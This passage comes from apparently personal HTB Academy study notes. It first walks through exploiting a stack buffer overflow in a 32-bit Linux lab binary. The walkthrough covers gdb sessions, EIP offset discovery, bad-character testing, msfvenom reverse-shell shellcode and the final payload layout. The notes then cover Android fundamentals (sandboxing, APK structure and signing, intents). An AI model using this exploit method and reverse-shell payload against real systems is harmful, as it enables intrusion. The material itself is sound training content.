segment, which contains statically allocated variables represented exclusively by 0 bits.Heap: memory area allocated to each program. Memory allocated to heap can be dynamically allocated, unlike memory allocated to stacks.Stack: Least-In-First-Out memory. The return address, parameters and sometimes frame pointers are stored in the stack memory. This is where local variables are stored. The linker reserves this area and usually places the stack in RAM's lower area above the global and static variables. The contents are accessed via the stack pointer, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.  Here is an example of a vulnerable program:  #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int bowfunc(char *string) { char buffer[1024]; strcpy(buffer, string); return 1; } int main(int argc, char *argv[]) { bowfunc(argv[1]); printf(&quot;Done.\\n&quot;); return 1; }   The user input is passed as an argument to the bowfunc. If the user introduces more than 1024 characters, the application will crash. If specially crafted input is passed, an attacker will reach to the return address and do whatever they want.  ","version":"Next","tagName":"h2"},{"title":"GDB Introduction​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#gdb-introduction","content":" GDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. We can set breakpoints, observe the memory contents of the application. We can also use it to disassemble the binary into machine code.  In the first column, we get some numbers that represent the memory address. The numbers with the plus sign (+) show the address jumps in memory in bytes, used for the respective instruction. Next, we can see the assembler instructions with registers and their operation suffixes.  There are two types of syntax:  AT&amp;T syntaxIntel syntax: The Intel syntax makes the disassembled representation easier to read  To change to intel syntax, run set disassembly-flavor intel in gdb.  To make the change permanent, you need to write to the gdbinit file:  echo 'set disassembly-flavor intel' &gt; ~/.gdbinit   ","version":"Next","tagName":"h2"},{"title":"CPU Registers​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#cpu-registers","content":" Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. However, some of them have a particular function. We'll list here only the relevant registers for buffer overflow.  Register\tDescriptionEIP\tInstruction Pointer stores the offset address of the next instruction to be executed ESP\tStack Pointer points to the top of the stack EBP\tBase Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack  Since the stack starts with a high address and grows down to low memory addresses as values are added, the Base Pointer points to the beginning (base) of the stack in contrast to the Stack Pointer, which points to the top of the stack.  Each function execution creates a Stack Frame inside the Stack. A stack frame defines a frame of data with the beginning (EBP) and the end (ESP) that is pushed onto the stack when a function is called.  When a function is executed with the call instruction, it performs two operations:  it pushes the return address onto the stack so that the execution of the program can be continued after the function has successfully fulfilled its goalit changes the instruction pointer (EIP) to the call destination and starting execution there.  ","version":"Next","tagName":"h2"},{"title":"Endianness​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#endianness","content":" There are two ways of reading bytes. Big-endian and little-endian. In big-endian, the digits with the highest valence are first. In little-endian, the digits with the lowest valence are at the beginning.  Now let's look at an example: we need to store the following hex word \\xAA\\xBB\\xCC\\xDD into the memory starting by position 0xffff0000:  Memory Address\t0xffff0000\t0xffff0001\t0xffff0002\t0xffff0003Big-Endian\tAA\tBB\tCC\tDD Little-Endian\tDD\tCC\tBB\tAA  ","version":"Next","tagName":"h2"},{"title":"Taking control of EIP​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#taking-control-of-eip","content":" In order to successfully manipulate the execution flow, we need to be able to manipulate the instruction pointer (EIP) to tell it to which address it should jump. This will cause the EIP to jump to where our payload begins and it will start the execution.  We can provide a very large input to the program using python in gdb:  student@nix-bow:~$ gdb -q bow32 (gdb) run $(python -c &quot;print '\\x55' * 1200&quot;) Starting program: /home/student/bow/bow32 $(python -c &quot;print '\\x55' * 1200&quot;) Program received signal SIGSEGV, Segmentation fault. 0x55555555 in ?? ()   We are inserting \\x55 value 1200 times in the program std input. If we observe the registers, we can confirm that the stack can be abused and the input we introduced has leaked into the stack:  (gdb) info registers eax 0x1 1 ecx 0xffffd6c0 -10560 edx 0xffffd06f -12177 ebx 0x55555555 1431655765 esp 0xffffcfd0 0xffffcfd0 ebp 0x55555555 0x55555555 # &lt;---- EBP overwritten esi 0xf7fb5000 -134524928 edi 0x0 0 eip 0x55555555 0x55555555 # &lt;---- EIP overwritten eflags 0x10286 [ PF SF IF RF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99   Visually, the memory will look like this:    With such large input, the base of the stack is surpassed and we have overwritten the EIP with \\x55. However, to write exactly into the EIP, we need to know exactly how many \\x55 characters we need to write to be at the EIP. Once we are at the EIP, the next 4 bytes will contain our desired memory address.  ","version":"Next","tagName":"h2"},{"title":"Determine the offset​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#determine-the-offset","content":" To determine the offset, we can use Metasplit framework. It will create a unique pattern of the specified length. When passed as input to the program, we'll see which part of the pattern leaks into the EIP. In this step, we want to cause a segmentation fault and see the registers at the end, i.e. don't set any breakpoints.  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt cat pattern.txt Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9 (gdb) run $(python -c &quot;print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'&quot;) The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/student/bow/bow32 $(python -c &quot;print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'&quot;) Program received signal SIGSEGV, Segmentation fault. 0x69423569 in ?? () (gdb) info registers eip eip 0x69423569 0x69423569 # We pass the found EIP address to a MSF utility and it will give us the exact offset to arrive to the EIP. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569 [*] Exact match at offset 1036   So, now we can write exactly at EIP with the following input:  (gdb) run $(python -c &quot;print '\\x55' * 1036 + '\\x66' * 4&quot;) The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/student/bow/bow32 $(python -c &quot;print '\\x55' * 1036 + '\\x66' * 4&quot;) Program received signal SIGSEGV, Segmentation fault. 0x66666666 in ?? ()   Now EIP will contain 0x66666666  ","version":"Next","tagName":"h2"},{"title":"Determine the length of the shellcode​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#determine-the-length-of-the-shellcode","content":" The shellcode is the piece of software we'll make the program execute by abusing of the stack. We'll provide this executable piece of code as part of the input, and we'll write its memory address into the EIP. In this case, we'll write a reverse shell as a shellcode. In order to do so, we'll use msfvenom tool:  msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c No encoder or badchars specified, outputting raw payload Payload size: 68 bytes &lt;SNIP&gt;   We'll need 68 bytes to accomodate our shellcode in memory. However, we'll increase the requirement to accomodate more complex shellcode if needed.  In order to have some space to ensure the execution, we can add some No operation instruction (NO-OP) before the shell code begins.  Summarizing, our input data will look like this:  Buffer = &quot;\\x55&quot; * (1040 - 100 - 150 - 4) = 786 NOPs = &quot;\\x90&quot; * 100 Shellcode = &quot;\\x44&quot; * 150 EIP = &quot;\\x66&quot; * 4   And visually:    ","version":"Next","tagName":"h2"},{"title":"Bad characters​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#bad-characters","content":" Applications might contain some reserved bytes known as bad characters. If these bytes are passed as input, the program will just write 0x00 into the memory. When creating the shellcode, it is important to determine such bad characters to avoid having them in the shell code.  Here we use the following character list to find out all characters we have to consider and to avoid when generating our shellcode:  CHARS=&quot;\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot;   The idea is that we'll pass the whole list of chars in the input, so the input now will look like this:  Buffer = &quot;\\x55&quot; * (1040 - 256 - 4) = 780 CHARS = &quot;\\x00\\x01\\x02\\x03\\x04\\x05...&lt;SNIP&gt;...\\xfd\\xfe\\xff&quot; EIP = &quot;\\x66&quot; * 4   Now, we just need to place a breakpoint just after the input is read from memory to analyse the memory contents. This is done in gdb with break &lt;function-name&gt;:  (gdb) break bowfunc Breakpoint 1 at 0x56555551   and then, we send the input and examine the memory  (gdb) run $(python -c 'print &quot;\\x55&quot; * (1040 - 256 - 4) + &quot;\\x00\\x01\\x02\\x03\\x04\\x05...&lt;SNIP&gt;...\\xfc\\xfd\\xfe\\xff&quot; + &quot;\\x66&quot; * 4') Starting program: /home/student/bow/bow32 $(python -c 'print &quot;\\x55&quot; * (1040 - 256 - 4) + &quot;\\x00\\x01\\x02\\x03\\x04\\x05...&lt;SNIP&gt;...\\xfc\\xfd\\xfe\\xff&quot; + &quot;\\x66&quot; * 4') /bin/bash: warning: command substitution: ignored null byte in input Breakpoint 1, 0x56555551 in bowfunc () # Examine the memory: 2000 units, in hexadecimal (x) and each unit is 1 byte(b). Start at ESP (top of the stack)+ 500 bytes x/2000xb $esp+500 &lt;SNIP&gt; 0xffffd5aa: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0xffffd5b2: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0xffffd5ba: 0x55 0x55 0x55 0x55 0x55 0x01 0x02 0x03 # |---&gt; CHARS begin 0xffffd5c2: 0x04 0x05 0x06 0x07 0x08 0x00 0x0b 0x0c 0xffffd5ca: 0x0d 0x0e 0x0f 0x10 0x11 0x12 0x13 0x14 0xffffd5d2: 0x15 0x16 0x17 0x18 0x19 0x1a 0x1b 0x1c &lt;SNIP&gt;   We see that the first byte in CHARS, 0x00 is not present, hence we cannot use 0x00 in the shellcode as it is a bad character. In similar way, we see that 0x09 is not present and is substituted by 0x00. Therefore, we can determine that 0x09 is also a bad character and should not be used in the shellcode.  This process must be repeated until all characters that could interrupt the flow are removed.  Usually bad characters are: &quot;\\x00\\x09\\x0a\\x20&quot;  ","version":"Next","tagName":"h2"},{"title":"Generating the shellcode​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#generating-the-shellcode","content":" Now we can tell msfvenom we don't want to use those bad characters in the shellcode:  adriangalera@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars &quot;\\x00\\x09\\x0a\\x20&quot; --out shellcode Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 95 (iteration=0) x86/shikata_ga_nai chosen with final size 95 Payload size: 95 bytes Final size of c file: 425 bytes Saved as: shellcode adriangalera@htb[/htb]$ cat shellcode unsigned char buf[] = &quot;\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1&quot; &quot;\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41&quot; &quot;\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b&quot; &lt;SNIP&gt;   Finally our input will look like this:  Buffer = &quot;\\x55&quot; * (1040 - 124 - 95 - 4) = 817 NOPs = &quot;\\x90&quot; * 124 Shellcode = &quot;\\xda\\xca\\xba\\xe4\\x11...&lt;SNIP&gt;...\\x5a\\x22\\xa2&quot; EIP = &quot;\\x66&quot; * 4'   ","version":"Next","tagName":"h2"},{"title":"Identification of the Return Address​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#identification-of-the-return-address","content":" now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously. Since NOPs will not do anything, it's completely fine to start the execution there. Examining the memory:  (gdb) x/2000xb $esp+1400 &lt;SNIP&gt; 0xffffd5ec: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0xffffd5f4: 0x55 0x55 0x55 0x55 0x55 0x55 0x90 0x90 # End of &quot;\\x55&quot;s ----&gt;| |---&gt; NOPS 0xffffd5fc: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd604: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd60c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd614: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd61c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd624: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd62c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd634: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd63c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd644: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd64c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd654: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xffffd65c: 0x90 0x90 0xda 0xca 0xba 0xe4 0x11 0xd4 # |---&gt; Shellcode &lt;SNIP&gt;   Here, we can select for example the position 0xffffd64c. Now the payload will be:  Buffer = &quot;\\x55&quot; * (1040 - 100 - 95 - 4) = 841 NOPs = &quot;\\x90&quot; * 100 Shellcode = &quot;\\xda\\xca\\xba\\xe4\\x11\\xd4...&lt;SNIP&gt;...\\x5a\\x22\\xa2&quot; EIP = &quot;\\x4c\\xd6\\xff\\xff&quot;   Note that the input of the address is entered backwards.  Since the shellcode is a reverse shell, when the payload is executed, we'll get a connection in the other side.  ","version":"Next","tagName":"h2"},{"title":"Prevention techniques and mechanisms​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#prevention-techniques-and-mechanisms","content":" The best protection against buffer overflows is security-conscious programming. However, there are some mechanisms that will help with buffer overflow vulnerabilities.  Canaries: canaries are known values written to the stack between buffer and control data to detect overflows. If a buffer overflow happens, the known values of the canaries will be altered and the operating system will detect that canary is overwitten. Address Space Layout Randomization (ASLR): it makes difficult to find addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. Data Execution Prevention (DEP): programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.  ","version":"Next","tagName":"h2"},{"title":"Python2 vs Python3​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#python2-vs-python3","content":" All previous usages of python are Python2.x. In python 3.x print function re-encodes the bytes. For example: it will re-encode the Unicode '\\x90' and may produce 0xC2 0x90 instead of 0x90.  For python3 it is better to generate a binary file and pass the contents of it to the gdb run command. For example:  python3 -c &quot;open('/tmp/p.bin','wb').write(b'\\x55'*1960 + b'\\x90'*100 + b'\\x66'*4)&quot; r $(cat /tmp/p.bin)   ","version":"Next","tagName":"h2"},{"title":"gdb or normal execution​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#gdb-or-normal-execution","content":" Bear in mind that when the program is run from gdb, the user that is running the program might be different than the normal execution. In some example the binary will lead to root access while running the binary from gdb will lead to normal user.  ","version":"Next","tagName":"h2"},{"title":"Summary​","type":1,"pageTitle":"Stack based buffer overflow on Linux","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux#summary","content":" The whole process can be summarized with:  Provide a very large input to see if the binary is vulnerable to buffer overflow.Once we knwow it is vulnerable, we need to know the offset to write the EIP pointer.We need to identify what characters and what not can be used in the shellcode.Create the shellcode avoiding the bad charactersJumping to Shellcode: find the proper memory address to write in the EIP. ","version":"Next","tagName":"h2"},{"title":"Android Fundamentals","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Android Fundamentals","content":"","keywords":"","version":"Next"},{"title":"Software stack​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#software-stack","content":" From lower level to higher level:  Linux kernel: managing device hardware such as the display, camera, bluetooth, wifi, audio, USB, and more. Threading and memory management. Also numerous security features (user-based permissions and process isolation). Hardware Abstraction Layer (HAL): standardized interface for interacting with hardware components, such as cameras, Bluetooth, sensors, and input devices. Acting as a bridge between hardware and the higher-level software layers, HAL ensures consistency in how software accesses hardware features. Given the different amount of hardware sensors, software needs to find a common interface to interact with the hardware. Android Runtime: Android Runtime (ART) is the managed runtime environment used by the Android operating system to execute applications. Application code is compiled into native machine code at install time. This is like the JVM but for Android, e.g: performs garbage collection, memory management, etc.. Native C/C++ libraries: Developers generally use these libraries to achieve high performance or write low-level code to interact directly with the hardware. Java API Framework: This component provides software tools and interfaces for building Android applications. System apps: This component includes all the pre-installed applications that come with the Android operating system.  ","version":"Next","tagName":"h2"},{"title":"Rooting​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#rooting","content":" Android separates the flash storage into the following two main partitions : /system and /data. The partition /system/ is used by the operating system, and the partition /data/ is used for user data and application installations.  In Android, users don't have root access to the operating system, and some partitions (like /system/) are read-only.  In order to have full root access to the device, you need to exploit some security flaws, this process is called Rooting.  ","version":"Next","tagName":"h2"},{"title":"Import directories​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#import-directories","content":" Directory\tDescription/data/data\tContains all the applications that are installed by the user /data/user/0\tContains data that only the app can access /data/app\tContains the APKs of the applications that are installed by the user /system/app\tContains the pre-installed applications of the device /system/bin\tContains binary files /data/local/tmp\tA world-writable directory /data/system\tContains system configuration files /etc/apns-conf.xml\tContains the default Access Point Name (APN) configurations. APN is used in order for the device to connect with the carrier /data/misc/wifi\tContains WiFi configuration files /data/misc/user/0/cacerts-added\tUser certificate store. It contains certificates added by the user /etc/security/cacerts/\tSystem certificate store. Permission to non-root users is not permitted /sdcard\tContains a symbolic link to the directories DCIM, Downloads, Music, Pictures, etc.  ","version":"Next","tagName":"h2"},{"title":"Android Security​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#android-security","content":" Kotlin and Java are the two primary languages used to develop Android applications. The Android SDK tools compile application source code along with resource files and assets into an Android Package (APK). An APK is an archive file with a .apk extension that contains all the components needed to install and run an Android app, including compiled bytecode (.dex), manifest metadata, resources, and native libraries.  Each Android application runs within its own isolated security sandbox, enforced by the underlying Linux-based architecture. This sandboxing model is supported by several core Android security features:  Android is a multi-user Linux system where each application is treated as a separate user. By default, the system assigns each app a unique Linux user ID (UID). This UID is used by the system for access control, but is not exposed to the app itself. File system permissions ensure that only the app assigned a particular UID can access its own files. Each app runs in its own process, and each process runs in a separate instance of the Android Runtime (ART) virtual machine, ensuring memory isolation. The system launches the app's process as needed and terminates it when no longer required or when reclaiming system resources. Android enforces the principle of least privilege, meaning apps only receive the permissions necessary to perform their core functionality. Additional privileges must be explicitly declared in the app's manifest and approved by the user (or system, depending on the API level).  Android uses Linux’s user-based security model to isolate applications by assigning each app a unique user ID (UID) and running it in its own process. This creates a kernel-level application sandbox that enforces strict boundaries between apps and the system, preventing unauthorized data access or code execution across app boundaries.  Escaping this sandbox requires compromising the kernel itself, typically through a privilege escalation exploit.  We can see this, when we list the files:  root:/# ls -l /data/data/ drwx------ 4 system system 4096 2022-12-28 11:47 android drwx------ 4 bluetooth bluetooth 4096 2022-12-28 11:47 com.android.bluetooth drwx------ 5 radio radio 4096 2022-12-28 11:48 com.android.ons drwx------ 5 shell shell 4096 2022-12-28 11:49 com.android.shell drwx------ 11 u0_a114 u0_a114 4096 2022-12-30 12:41 com.android.chrome drwx------ 5 u0_a119 u0_a119 4096 2022-12-28 11:49 com.android.camera2   To install an application on a device or upload it to the Play Store, the APK file must be signed. Signing the APK is crucial for security, as it protects the package from malicious modifications.  The certificates that are used to sign an application are self-signed. One can sign an APK file with apksigner tool (Signature Scheme v4) using the following commands:  echo -e &quot;password\\npassword\\njohn doe\\ntest\\ntest\\ntest\\ntest\\ntest\\nyes&quot; &gt; params.txt cat params.txt | keytool -genkey -keystore key.keystore -validity 1000 -keyalg RSA -alias john zipalign -p -f -v 4 myapp.apk myapp_signed.apk echo password | apksigner sign --ks key.keystore myapp_signed.apk   Verified Boot is an Android security feature that ensures the integrity of the operating system. This is achieved using a unique set of cryptographic keys to sign and verify the boot image and ensure that only the authorized parties can modify the system  ","version":"Next","tagName":"h2"},{"title":"APK Structure​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#apk-structure","content":" The Android Package Kit file—commonly known as an APK—is the file format used by the Android operating system to distribute and install applications. An APK is essentially an archive that contains all the components needed for an Android app to run. It is based on zip, therefore it can be unzipped:  adriangalera@htb[/htb]$ unzip myapp.apk adriangalera@htb[/htb]$ ls -l total 27584 -rw-r--r-- 1 bertolis bertolis 4220 Jan 1 1981 AndroidManifest.xml drwxr-xr-x 49 bertolis bertolis 1568 May 10 13:36 META-INF drwxr-xr-x 3 bertolis bertolis 96 May 10 13:36 assets -rw-r--r-- 1 bertolis bertolis 8285624 Jan 1 1981 classes.dex # contains the application code drwxr-xr-x 9 bertolis bertolis 288 May 10 13:36 kotlin drwxr-xr-x 6 bertolis bertolis 192 May 10 13:36 lib drwxr-xr-x 545 bertolis bertolis 17440 May 10 13:36 res -rw-r--r-- 1 bertolis bertolis 922940 Jan 1 1981 resources.arsc   The files extracted from the APK are encoded, and neither the source code nor the configuration files are human-readable.  Let's deep dive:  META-INF: contains verification informationassets: This folder contains assets that developers bundle with the application, and can be retrieved by the AssetManager.lib: This folder contains native libraries with compiled code targeting different device architectures. Android applications that use the Native Development Kit (NDK) may include components written in C or C++.res: This folder contains predefined application resources that cannot be modified by the user at runtime, unlike assets. These resources include XML files defining color state lists, UI layouts, fonts, values, configurations for OS versions, screen orientations, network settings, and more.AndroidManifest.xml: metadata about the application.classes.dex: This file contains all compiled Java (or Kotlin) classes in DEX (Dalvik Executable) format, which are executed by the Android Runtime (ART).resources.arsc: This file contains precompiled resources that are used by the app at runtime. It maps resource identifiers in the code (e.g., R.string.app_name) to their actual values, such as strings, colors, layouts, and styles.  ","version":"Next","tagName":"h2"},{"title":"Types of application​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#types-of-application","content":" Native: direct access to platform. Built with Kotlin or Java.Web apps: developed to be responsive and accessible from mobile web browsers. They are typically built using HTML, CSS, and JavaScript.Hybrid apps: Hybrid apps combine elements of both native and web apps and are designed to be cross-platform. They use WebViews to display web content within a native app container.  ","version":"Next","tagName":"h2"},{"title":"Android Application Components and IPC​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#android-application-components-and-ipc","content":" Application components are the building blocks that define different parts of an Android application, such as the user interface and core functionality. These components are declared in the AndroidManifest.xml and can be used individually or in tandem with one another. Interprocess Communication (IPC) is a mechanism that allows for communication between applications or different processes within the same application.  ","version":"Next","tagName":"h2"},{"title":"Activities​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#activities","content":" Activities are a fundamental application component, representing a single screen with a user interface. An Activity is the main component that allows the interaction between the user and the app, and can be started by other Activities, apps, or system events.  The Android operating system maintains an Activity stack as part of the task that the app belongs to. When a new Activity is launched, it's placed on top of the stack and becomes the active Activity. The previous Activity is paused and remains in the stack.  Activities are declared in AndroidManifest.xml and can be exported so that other apps can use the activity.  The exported attribute can be set on &lt;activity&gt;, &lt;service&gt;, &lt;receiver&gt;, and &lt;provider&gt; elements in the AndroidManifest.xml file.  ","version":"Next","tagName":"h3"},{"title":"Services​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#services","content":" A Service is an Android application component that performs long-running operations in the background without providing a user interface. Services can be used for tasks like downloading files, playing music, or communicating with a remote server, and can continue working even after the user has left the app.  There are:  Foreground services: Foreground services perform operations that require user attention. Will generate notifications, e.g: media players or navigation apps. Background services: perform operations that do not require user interaction. Bound services: They provide a client-server interface that enables components—even across different processes—to interact with the service using Interprocess Communication (IPC).  ","version":"Next","tagName":"h3"},{"title":"Broadcast receivers​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#broadcast-receivers","content":" Broadcast Receivers can be considered as both Application Components and Interprocess Communication (IPC) mechanisms.  As an IPC mechanism, Broadcast Receivers enable communication between different applications by sending and receiving Intents. These Intents can be sent by the Android system, other apps, or the app itself.  As an Application Component, Broadcast Receivers are designed to respond to system-wide or custom events broadcasted by other applications.  ","version":"Next","tagName":"h3"},{"title":"Content Providers​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#content-providers","content":" As an IPC mechanism, Content Providers enable communication between applications by allowing them to access, modify, or delete data using a consistent interface through the ContentResolver class.  As an application component, Content Providers are responsible for managing and exposing data structures within or to other apps.  They allow data sharing inside or outside the application.  ","version":"Next","tagName":"h3"},{"title":"Intents​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#intents","content":" Messaging objects used by applications or the Android system to request actions from other components such as Activities, Services, and Broadcast receivers. While Intents are not primarily designed for Interprocess Communication (IPC), they may be used when an application wants to interact with a component (such as a service) that resides in a different process.  Typical use cases are:  Starting an activity:  Intent intent = new Intent(this, ContactDetailActivity.class); intent.putExtra(&quot;contact_id&quot;, selectedContactId); startActivity(intent);   Starting a service:  Intent intent = new Intent(this, DownloadService.class); intent.putExtra(&quot;file_url&quot;, fileUrl); startService(intent);   Deliver a broadcast message:  Intent intent = new Intent(&quot;com.example.ACTION_BATTERY_LOW&quot;); sendBroadcast(intent);   We can define explicit intents such as:  Intent intent = new Intent(this, TargetActivity.class); startActivity(intent);   which is used to navigate inside the app. The class has to be known.  or implicit intents, where we don't know exactly the class but we rely on the system to find a suitable actor to perform an action:  Intent intent = new Intent(Intent.ACTION_VIEW); intent.setData(Uri.parse(&quot;https://www.example.com&quot;)); startActivity(intent);   Intents can have data using the putExtra method:  Intent intent = new Intent(this, TargetActivity.class); intent.putExtra(&quot;key&quot;, &quot;value&quot;); startActivity(intent);   ","version":"Next","tagName":"h3"},{"title":"Binders​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#binders","content":" The Binder is Android's core Interprocess Communication (IPC) mechanism, enabling efficient and secure communication between different processes.  It allows a client process to invoke methods on a remote object located in another process (but owned by the same application) as if the object were local.  ","version":"Next","tagName":"h3"},{"title":"Deep links​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#deep-links","content":" A Deep Link is an Interprocess Communication (IPC) mechanism that allows users to navigate directly to specific content within an app.  For example, a user might receive a promotional email about a flash sale on a specific product. Instead of directing the user to the website, the link opens the corresponding app to display the product.  There are standard deep links:  &lt;div&gt; &lt;p&gt;Buy our latest PC parts.&lt;/p&gt; &lt;a href=&quot;app://myapp/products/cpu&quot;&gt; &lt;/a&gt; &lt;/div&gt;   If we declare an this intent-filter:  &lt;data 